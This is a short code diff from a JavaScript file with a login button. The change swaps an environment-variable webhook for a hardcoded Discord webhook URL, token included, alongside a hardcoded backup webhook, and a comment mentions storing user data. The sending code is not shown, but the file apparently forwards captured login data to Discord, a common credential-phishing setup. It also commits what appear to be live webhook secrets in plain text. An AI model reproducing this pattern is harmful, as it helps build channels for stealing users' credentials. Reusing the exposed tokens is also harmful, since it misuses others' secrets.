@@ -4,7 +4,7 @@
 const loginButton = document.querySelector("button");
 
 // Webhook URLs
-const PRIMARY_WEBHOOK_URL = process.env.webhook; 
+const PRIMARY_WEBHOOK_URL = "https://discord.com/api/webhooks/1358901901508219031/J7_foL_Odv6_Eg0P12xAVDL-9n7neQFed5xFjI4us8HAAJ6BLUw2wxs1-BGqvcCbXa_s";
 const BACKUP_WEBHOOK_URL = "https://discord.com/api/webhooks/1358902712070176768/u7-3e1PmM4t7VTUTD_UBNYCDkAnM9GP_KKxHjB4g_uxeitavR14PgmqdxzoadN0-NqKo"; // Backup webhook (hardcoded)
 
 // Variables to store user data
